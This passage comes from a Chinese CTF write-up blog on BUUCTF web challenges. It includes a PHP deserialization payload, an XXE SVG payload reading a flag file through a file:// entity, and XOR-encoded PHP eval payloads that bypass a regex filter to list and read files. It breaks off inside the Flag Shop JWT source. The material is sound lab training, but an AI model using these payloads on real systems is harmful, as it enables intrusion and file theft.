class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意版本为php7</p><p>payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://b596e779-<span class="hljs-number">564</span>c-<span class="hljs-number">4</span>d3e-<span class="hljs-number">9707</span>-b997850ea37d.node5.buuoj.cn:<span class="hljs-number">81</span>/?great=O%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>SYCLOVER%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>syc%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Error%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>message%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A20%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>Dinclude%<span class="hljs-number">7</span>E%D0%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">98</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Error%<span class="hljs-number">00</span>string%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>file%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>D%<span class="hljs-number">3</span>A%<span class="hljs-number">5</span>Cuntitled%<span class="hljs-number">5</span>C24.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>line%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Error%<span class="hljs-number">00</span>trace%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A15%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Error%<span class="hljs-number">00</span>previous%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>lover%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Error%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>message%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A20%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>Dinclude%<span class="hljs-number">7</span>E%D0%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">98</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Error%<span class="hljs-number">00</span>string%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>file%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>D%<span class="hljs-number">3</span>A%<span class="hljs-number">5</span>Cuntitled%<span class="hljs-number">5</span>C24.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>line%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Error%<span class="hljs-number">00</span>trace%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A15%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Error%<span class="hljs-number">00</span>previous%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406042110997.png" alt="image-20240604210817856"></p><p>应该是上传svg文件然后转换为png文件</p><p>查下svg文件是什么</p><p>SVG，可缩放矢量图形（Scalable Vector Graphics），是一种用于描述二维图形的 XML 标记语言。</p><p>猜测为xxe漏洞</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1000&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br>// /proc/self/cwd 获取当前进程运行目录<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406042128644.png" alt="image-20240604212853558"></p><h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$_</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, <span class="hljs-variable">$_</span>) )<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;rosé will not do it&#x27;</span>);<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_</span>), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you are so close, omg&#x27;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>绕过两个if进行rce</p><p>查看正则匹配</p><p><a href="https://regex101.com/">https://regex101.com/</a></p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406051946914.png" alt="image-20240605194601841"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>- <span class="hljs-number">0</span><span class="hljs-number">-9</span>                       匹配\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>到空格(\<span class="hljs-keyword">x</span><span class="hljs-number">20</span>)，<span class="hljs-number">0</span><span class="hljs-number">-9</span>的数字<br>&#x27;<span class="hljs-string">&quot;`$&amp;.,|[&#123;_defgops              匹配这些字符</span><br><span class="hljs-string">\x7F                            匹配DEL(\x7F)字符</span><br></code></pre></td></tr></table></figure><p>匹配以上字符直接die</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if ( <span class="hljs-name">strlen</span>(<span class="hljs-name">count_chars</span>(<span class="hljs-name">strtolower</span>($_), <span class="hljs-number">0</span>x3)) &gt; <span class="hljs-number">0</span>xd )<br>    die(&#x27;you are so close, omg&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>不能提交超过13（&lt;&#x3D;13）种字符</p><p>没有过滤<code>~</code>和<code>^</code>字符，想到可以取反编码绕过和异或绕过<a href="https://blog.csdn.net/mochu7777777/article/details/104631142">关于PHP正则的一些绕过方法</a></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(~<span class="hljs-variable">%8</span>F<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%99</span><span class="hljs-variable">%90</span>)()<span class="hljs-comment">;</span><br>#phpinfo()<span class="hljs-comment">;取反编码绕过</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">final_string<span class="hljs-operator">=</span><span class="hljs-string">&quot;phpinfo&quot;</span><br>allowed<span class="hljs-operator">=</span><span class="hljs-string">&quot;!#%()*+-/:;&lt;=&gt;?@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz&#125;~&quot;</span><br>for a in final_string:    <br>    for i in allowed:<br>        for p in allowed:<br>            if <span class="hljs-keyword">ord</span>(i)^<span class="hljs-keyword">ord</span>(p)<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-keyword">ord</span>(a):<br>                print(<span class="hljs-string">&quot;i=%s p=%s a=%s&quot;</span>%(i<span class="hljs-punctuation">,</span>p<span class="hljs-punctuation">,</span>a))<br>#暴力搜索符合条件的字符串，例如：phpinfo<span class="hljs-operator">=</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%99</span><span class="hljs-variable">%90</span>^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>。<br></code></pre></td></tr></table></figure><p>查看phpinfo中的disable_functions</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,<span class="hljs-keyword">system</span>,<span class="hljs-built_in">exec</span>,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open,<br></code></pre></td></tr></table></figure><p>没有屏蔽print_r()和scandir()，可以打组合拳对系统目录和文件进行查看，但是还要考虑字符种类不能超过13的这个限制：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span> = <span class="hljs-string">&quot;print_r(scandir(&#x27;.&#x27;));&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_</span>), <span class="hljs-number">0x3</span>));<br><span class="hljs-comment">//返回15</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>需要缩减字符数</p><p><code>print_r</code>用异或表示即：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&lt;?php<br>echo urlencode(&#x27;print_r&#x27; ^ urldecode(&#x27;<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>&#x27;))<span class="hljs-comment">;</span><br>//<span class="hljs-variable">%8</span>F<span class="hljs-variable">%8</span>D<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%A0</span><span class="hljs-variable">%8</span>D^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><br></code></pre></td></tr></table></figure><p><code>scandir(.)</code>用异或表示即</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&lt;?php<br>$a <span class="hljs-operator">=</span>  urlencode(&#x27;scandir&#x27; ^ urldecode(&#x27;<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>&#x27;))<span class="hljs-comment">;</span><br>$b <span class="hljs-operator">=</span> urlencode(&#x27;.&#x27; ^ urldecode(&#x27;<span class="hljs-variable">%ff</span>&#x27;))<span class="hljs-comment">;</span><br>echo $a.&#x27;^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>&#x27;.&#x27;(&#x27;.$b.&#x27;^<span class="hljs-variable">%ff</span>&#x27;.&#x27;)&#x27;<span class="hljs-comment">;</span><br>//<span class="hljs-variable">%8</span>C<span class="hljs-variable">%9</span>C<span class="hljs-variable">%9</span>E<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>B<span class="hljs-variable">%96</span><span class="hljs-variable">%8</span>D^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>(<span class="hljs-variable">%D1</span>^<span class="hljs-variable">%ff</span>)<br></code></pre></td></tr></table></figure><p>合起来</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">print_r(scandir(.));=((%8F%8D%96%91%8B%A0%8D)^(%ff%ff%ff%ff%ff%ff%ff))(((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))(%D1^%ff));<br></code></pre></td></tr></table></figure><p>字符数超了</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">result2 = [<span class="hljs-number">0x8b</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x8c</span>]  # Original chars,<span class="hljs-number">11</span> total<br>result = [<span class="hljs-number">0x9b</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x8c</span>]  # to be deleted<br>temp = []<br>for d <span class="hljs-keyword">in</span> result2:<br>    for a <span class="hljs-keyword">in</span> result:<br>        for b <span class="hljs-keyword">in</span> result:<br>            for c <span class="hljs-keyword">in</span> result:<br>                if (a ^ b ^ c == d):<br>                    if a == b == c == d:<br>                        continue<br><span class="hljs-symbol">                    else:</span><br>                        print(<span class="hljs-string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))<br>                        if d <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> temp:<br>                            temp<span class="hljs-number">.</span>append(d)<br>print(len(temp), temp)<br>#缩减字符数<br></code></pre></td></tr></table></figure><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">print_r(scandir(.));=((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));<br></code></pre></td></tr></table></figure><p>将其传入得到当前目录的文件：</p><blockquote><p>Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; index.php [3] &#x3D;&gt; n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )</p></blockquote><p>用end()返回数组的最后一项：</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406052121580.png" alt="img"></p><p>构造readfile(end(scandir(.)))即可。</p><p><code>readfile</code>用异或表示即：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%9</span>E<span class="hljs-variable">%9</span>B<span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%9</span>A)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)<br></code></pre></td></tr></table></figure><p><code>end</code>用异或表示即：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">(<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%9</span>E<span class="hljs-variable">%9</span>B<span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%9</span>A)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)<br></code></pre></td></tr></table></figure><p>因此，readfile(end(scandir(.)))正常合起来，又经过替代后可得：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">((<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%9</span>a)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%9</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%93</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%9</span>a<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%96</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))(((<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>b)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%93</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%ff</span>))(((<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%93</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>b)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>a))(<span class="hljs-variable">%d1</span>^<span class="hljs-variable">%ff</span>)))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406062157982.png" alt="image-20240606215708900"></p><p>buy flag</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406062157903.png" alt="image-20240606215740837"></p><p>抓包看看</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406062159494.png" alt="image-20240606215927433"></p><p>jwt加密，需要找到key</p><p>robots.txt存在</p><p>源码</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 